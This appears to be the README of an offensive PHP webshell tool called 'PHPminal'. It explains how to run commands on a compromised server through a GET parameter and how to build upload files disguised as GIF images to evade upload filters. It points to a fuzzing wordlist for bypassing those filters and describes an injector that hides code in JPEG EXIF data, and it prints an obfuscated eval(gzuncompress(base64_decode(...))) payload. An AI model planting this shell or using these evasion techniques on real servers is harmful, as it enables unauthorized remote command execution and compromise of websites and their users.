# PHPminal webshell

PHP terminal-emulator styled reverse shell.

Commands can be entered in the input field or you can set the GET-paremeter `cmd` to hand over a command (useful for scripting) - e.g.: `https://haked.site/profilepics/phpminal.jpg.php?cmd=whoami`

## File generation 

The script `make_uploadfiles.sh` allowes to generate a few files ready to upload and the option `-g` allow to inject the magic bytes for a GIF file into the webshell while creating the files ready to upload.

This should be sufficient for many badly implemented filters or some siconfigured servers.

```bash
$ bash make_uploadfiles.sh -h

USAGE:
make_uploadfiles.sh [OPTIONS]

Options:
  -g ... Inject GIF89a in the files to imitate a GIF file

$ bash make_uploadfiles.sh -g
DONE!
```

### If the generated files are not sufficient

In case none of the files can be uploaded, provide the file `FUZZING_WORDLIST.txt` a already predefined list of all the attacks generated by the bash script plus an added layer of character injection into the filenames. This list can be used with the Burp Intruder or ZAP Fuzzer.

### Injector *)

This script compress and Base64 encode a script and allow to inject it into the EXIF data of a JPEG image as copyright information. Furthermore the injected code is printed to the screen to be used in other typed of documents and files.

```bash
$ php -f injector.php phpminal.php ready2upload/infected.jpg
<?php eval(gzuncompress(base64_decode('eJytV+9u2zYQ/x4g78AxLmQHlewkK4bZstclTdoAXRI0WYGhKQJaoiyilKiRlB3PHbAH2Mc+YZ9kR1JyLNtfutowYul497v/x8v+XlLmkWYiR7LMH6IsbrfgT2exv4fg0xKlRkOUEK7ooEF6qVLK+QN9pJGTqI5Z0jYcnQWSVJcyt/wD9Lc7pYBTQTew5krTzOI8Ry0QfE94DdgA3Ya5BXcVe8PCDdCtljaQaw6MG+fVI/zAd3+PRqlAXvjDq+uzuz9uzlGqMz7a3wuXv5TEIycSaqY5Hd28uclYTjiaHgW9sOuIFYfS8+WL+RwuUEbkhOV91CseB6ggcczySfW2YtVYxPMFigQXso8OTk9PB2hMok8TKco89mv60dHRACUi135CMsbnfYTPRCkZleiKzvBzVL09R5nIhSpIRBtaDiCi16UuSl3b5Y+F1iLro6PjpoFHL9YsPEiEzBaoEIqZyuujhD3SGMysAKw4p4muHp/Mrw2vsH0tihq/Jjm5BkmySVrTZizWKcj0etNZ0yiWFwswQcZU1nrty5NfxSOK4ZnG6ODk5GSAGoZpSXIIk6S5Xmr56cWzwTITFxcX3x5xyz+jzoGx4HHTZpUKqaNSK7TYlmRr5TIPJ2D/lhhU2XOhPF5LFVk07V896qdiSuUTw8+9XoNBZYTzhXNBsb8oxKP3bMkRdusKD7u2M7zBShOZIkYi54LEQxyLqMwgrsGE6nNOzePp/DJu33uQs3uvEyTAoNqdAbYgtm0dTMymiAHCslifOKoRwJSiut16eH1+98EDNu9jByZC6+Hm+vbug5HDH2GKuHP3aj3YimFlliBbx9HqJF07Ws7fBs4ar/ULh4WkIxyYwaIKGjHCo5RI5eZZgMOuPR9sTKoqKl0Iy3qkTEuijOpUQLiMARgRey8MsReMiaI5yWgbEkDzaRvfnr27vLl7uLh8e37162/nuNMJPGwjbXCaQW6VCkp8CA3CsnbtJJ6lAroABFc5U6H0BqchGuVNXjO9HfAQYSmExiZtihYgjw/MnK5Gd01rNWe3C+TXL/9+/fLPh3CMbDEOPVfLtpS9kVUQdsejlxsMphmAwdhmGD6GY9kIeA3/BeDd1xmyweOFUMOQfz0v6BBr+qgxMt7amnUhBQaMpoSX1ORiM+mNeoE8jFADU5XjjOklAsQ1CAKMIk6UGuKxznHVemt21b2znDF41KzF0Db4GtEeEJRKmgzxL2DT0AtKyWkeiZi2ccLyGHWRb0xDCfILCmXn937s9XrI5wpb+y8M0+3vl6/gYuBUhV0yQp93oeZ4i5rXO1TDTObQPT6MRJ6wyeE9XtFUE79Dj3PjeM2FmWSakjGnKGZSIQKk73XI+gGlRqKIqlVdS9oOwAsowFncBHe07wBfpgCG1qdm/A1lJ8jqT76GDJT/gZxTrTTRyCcO7Mq9fzuSx2AvcCMHJkz15H/bB68ilNZXn6zSuIqKsknIxI71xtBE6Sohg31GN5WO+adVQgQBhPtORF1YvrRdKNVujUokpWtmPSmFZYTliditRq5SWMzSmUFGvm8n8G41sMRNo7Ucu6d357fXb98HZ9dXF/3aWaqjrqRK8GlgJDeF3sAldOubjaAhY27IHeejUGB1+Yg+IzqRcKf6U4RtwQaHtkbxTtV5tjVv58okw7Tm2iXYXb8F3XpVL7lmH7I7rtlo3bJr/h00N+5/TqM9wQ=='))); ?>
```

*) Requires the programm `exiftool` to be installed.
